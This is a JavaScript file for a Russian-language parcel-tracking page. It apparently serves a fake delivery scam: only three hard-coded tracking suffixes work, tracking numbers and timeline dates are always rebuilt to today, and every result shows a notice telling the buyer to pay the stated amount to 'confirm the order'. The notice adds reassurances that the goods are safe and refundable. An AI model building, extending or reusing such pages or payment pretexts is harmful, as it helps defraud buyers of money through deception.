(function () {
  const VALID_SUFFIXES = ["2231", "2232", "2233"];

  const OFFER_NOTICE_PARAS = [
    "В связи с обновлением договора оферты и условиями работы нашей курьерской службы, для подтверждения заказа необходимо произвести оплату по указанной стоимости.",
    "Не переживайте, ваш товар находится у нас и полностью сохранён.",
    "Данная мера введена для безопасности обеих сторон и предотвращения мошеннических действий.",
    "В случае отмены заказа со стороны продавца или покупателя оплаченная сумма подлежит полному возврату.",
    "Возврат средств производится в соответствии с условиями договора оферты.",
    "Благодарим за доверие.",
  ];

  function normalizeKey(raw) {
    return raw.trim().toUpperCase().replace(/\s+/g, "").replace(/—/g, "-");
  }

  const MONTHS_RU = [
    "января", "февраля", "марта", "апреля", "мая", "июня",
    "июля", "августа", "сентября", "октября", "ноября", "декабря",
  ];

  function todayLocal() {
    const now = new Date();
    return new Date(now.getFullYear(), now.getMonth(), now.getDate());
  }

  function sameCalendarDay(a, b) {
    return (
      a.getFullYear() === b.getFullYear() &&
      a.getMonth() === b.getMonth() &&
      a.getDate() === b.getDate()
    );
  }

  function formatRuDate(d) {
    return `${d.getDate()} ${MONTHS_RU[d.getMonth()]}`;
  }

  function shiftDate(base, dayDelta, h, m) {
    const d = new Date(base.getFullYear(), base.getMonth(), base.getDate(), h, m, 0, 0);
    d.setDate(d.getDate() + dayDelta);
    return d;
  }

  function pad2(n) {
    return String(n).padStart(2, "0");
  }

  function trackPrefixForDate(d) {
    return `INDEX-${d.getFullYear()}-${pad2(d.getMonth() + 1)}-${pad2(d.getDate())}-`;
  }

  function trackNumberForToday(suffix, date) {
    return `${trackPrefixForDate(date)}${suffix}`;
  }

  const TRACK_FULL_RE = /^INDEX-(\d{4})-(\d{2})-(\d{2})-(\d+)$/;

  function extractSuffix(key) {
    const match = key.match(TRACK_FULL_RE);
    if (match) {
      const [, y, m, d, suffix] = match;
      if (!VALID_SUFFIXES.includes(suffix)) return null;

      const entered = new Date(+y, +m - 1, +d);
      if (!sameCalendarDay(entered, todayLocal())) return null;

      return suffix;
    }

    if (VALID_SUFFIXES.includes(key)) return key;
    return null;
  }

  function escapeHtml(str) {
    const el = document.createElement("div");
    el.textContent = str;
    return el.innerHTML;
  }

  function renderOfferNotice() {
    return `
      <div class="track-offer-notice" role="region" aria-label="Информация об оплате">
        ${OFFER_NOTICE_PARAS.map((p) => `<p class="track-offer-notice__p">${escapeHtml(p)}</p>`).join("")}
      </div>`;
  }

  function formatRoute(order) {
    const from = order.origin || "";
    const to = order.destination || "";
    if (from && to) return `${from} → ${to}`;
    if (from) return `Точка отправки: ${from}`;
    if (to) return `Место прибытия: ${to}`;
    return "—";
  }

  function resolveStepDates(steps, today) {
    const defaults = [
      formatRuDate(shiftDate(today, 0, 9, 0)),
      formatRuDate(shiftDate(today, 0, 11, 30)),
    ];

    return (steps || []).map((step, index) => ({
      ...step,
      date: defaults[index] || formatRuDate(today),
    }));
  }

  function renderTimeline(steps, today) {
    return resolveStepDates(steps, today)
      .map((s) => {
        const cls = ["track-step"];
        if (s.done) cls.push("track-step--done");
        if (s.warehouse) cls.push("track-step--warehouse");
        if (s.current) cls.push("track-step--current");
        if (s.muted) cls.push("track-step--muted");
        const detail = s.detail ? `<span class="track-step__detail">${escapeHtml(s.detail)}</span>` : "";
        return `
          <li class="${cls.join(" ")}">
            <div class="track-step__content">
              <time class="track-step__date">${escapeHtml(s.date || "")}</time>
              <strong class="track-step__title">${escapeHtml(s.title || "")}</strong>
              ${detail}
            </div>
          </li>`;
      })
      .join("");
  }

  function optionalCard(label, value) {
    if (!value) return "";
    return `
      <div class="track-result__card">
        <span class="track-result__label">${escapeHtml(label)}</span>
        <p class="track-result__value">${escapeHtml(value)}</p>
      </div>`;
  }

  function render(order, displayId, today) {
    const statusClass = order.status_class || "track-status--pending";
    const statusLabel = order.status_label || "В обработке";

    return `
      <div class="track-result__grid">
        <div class="track-result__card track-result__card--wide">
          <span class="track-result__label">Трек-номер</span>
          <p class="track-result__id">${escapeHtml(displayId)}</p>
          <span class="track-status ${escapeHtml(statusClass)}">${escapeHtml(statusLabel)}</span>
        </div>
        <div class="track-result__card">
          <span class="track-result__label">Маршрут</span>
          <p class="track-result__value">${escapeHtml(formatRoute(order))}</p>
        </div>
        <div class="track-result__card">
          <span class="track-result__label">Тариф / вес</span>
          <p class="track-result__value">${escapeHtml(order.weight || "—")}</p>
        </div>
        <div class="track-result__card">
          <span class="track-result__label">Ориентировочно</span>
          <p class="track-result__value">${escapeHtml(order.eta || "—")}</p>
        </div>
        ${optionalCard("Получатель", order.recipient_name)}
        ${optionalCard("Адрес", order.recipient_address)}
        ${optionalCard("Телефон", order.recipient_phone)}
      </div>
      ${renderOfferNotice()}
      <div class="track-timeline-wrap">
        <h2 class="track-timeline-heading">История перемещений</h2>
        <ol class="track-timeline" aria-label="Этапы доставки">
          ${renderTimeline(order.steps, today)}
        </ol>
      </div>`;
  }

  async function loadShipment(suffix) {
    if (!suffix || !VALID_SUFFIXES.includes(suffix)) return null;

    try {
      const res = await fetch(`content/shipments/${encodeURIComponent(suffix)}.json`, {
        cache: "no-store",
      });
      if (!res.ok) return null;
      return await res.json();
    } catch {
      return null;
    }
  }

  const form = document.getElementById("track-form");
  const input = document.getElementById("track-input");
  const resultEl = document.getElementById("track-result");
  const emptyEl = document.getElementById("track-empty");
  const panel = document.querySelector(".track-panel");
  const submitBtn = form?.querySelector(".track-submit");

  function showResult(html) {
    emptyEl.hidden = true;
    resultEl.hidden = false;
    resultEl.innerHTML = html;
    resultEl.classList.add("track-result--show");
    panel?.classList.add("track-panel--has-result");
  }

  function showEmpty() {
    resultEl.hidden = true;
    resultEl.innerHTML = "";
    resultEl.classList.remove("track-result--show");
    emptyEl.hidden = false;
    panel?.classList.remove("track-panel--has-result");
  }

  function setLoading(loading) {
    if (submitBtn) {
      submitBtn.disabled = loading;
      submitBtn.textContent = loading ? "Поиск…" : "Найти";
    }
  }

  async function submit(raw) {
    const key = normalizeKey(raw);
    const suffix = extractSuffix(key);
    if (!suffix) {
      showEmpty();
      return;
    }

    const today = todayLocal();
    const displayId = trackNumberForToday(suffix, today);

    setLoading(true);
    try {
      const order = await loadShipment(suffix);
      if (!order) {
        showEmpty();
        return;
      }
      if (input) input.value = displayId;
      showResult(render(order, displayId, today));
    } finally {
      setLoading(false);
    }
  }

  form?.addEventListener("submit", (e) => {
    e.preventDefault();
    submit(input?.value || "");
  });

  const params = new URLSearchParams(window.location.search);
  const q = params.get("q") || params.get("track") || params.get("id");
  if (q && input) {
    input.value = q;
    submit(q);
  }
})();
